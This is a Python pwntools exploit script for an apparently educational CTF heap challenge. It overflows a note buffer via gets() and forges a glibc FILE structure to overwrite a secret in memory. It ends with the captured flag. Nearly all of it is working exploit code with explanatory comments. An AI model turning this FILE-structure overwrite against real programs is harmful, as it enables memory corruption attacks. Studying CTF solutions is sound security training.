from pwn import *

context.arch = 'amd64'
r = remote('edu-ctf.zoolab.org', 30216)

r.recvuntil(b'0x')

note_buf = int(r.recvline(), 16)
# program will assign one chunk for the debug_secret
# Then the program will assign one chunk for the malloc for note_buf
# To calculate the debug_secret address just subtract the note_buf address on chunk
# and the address of debug_secret
# Note that the address of data of debug_secret starts from debug_secret_addr[0x10], due to the chunk header
# In this case, it's note_buf - (debug_secret_addr+0x10)
debug_secret_addr = note_buf - 0x30
debug_secret_val = b"gura_50_cu73\x00"

# note_buf can be overflowed due to write_note() function using gets()
# Thus we can use create_note() to create a new note and get a new chunk
# and the value inside this chunk can be overflowed by buf_note
# And since this chunk will be used as file structure in load_note() function
# If we change the buffer pointer of this new chunk to point to the debug_secret_addr
# and with other limitations, we can write arbitrary value to debug_secret_addr

# create_note()
r.sendlineafter(b'>', b'1')

# write_note() for overflow
r.sendlineafter(b'>', b'2')
# Calculate offset for overflow
# This can be calculated by first find address of _flags in file structure of the chunk created by create_note
# Then subtract it with note_buf
offset = 0x210
# Create fake file structure to make the pointer points to debug_secret_addr
""" Conditions for arbitrary read
_flags &= ~_IO_EOF_SEEN
_flags &= ~_IO_NO_READS
_IO_read_ptr >= _IO_read_end
_IO_buf_base != NULL
"""
_flags = 0x0
payload = fake_file_struct = flat(
    _flags, 0,
    0, 0,
    0, 0,
    # _IO_buf_base = start address of buffer to be wrote
    0, debug_secret_addr,
    # _IO_buf_end = end address of buffer to be wrote
    debug_secret_addr + 0x20, 0,
    0, 0,
    0, 0,
    # fileno = 0 = stdin
    0
)
r.sendlineafter(b"data> ", b'A'*offset + payload)
r.sendlineafter(b'>', b'4')
r.sendline(debug_secret_val)
r.interactive()

#FLAG{600d_mu51c_53r135_p4r7_2_youtu.be/g0lQESej9zc}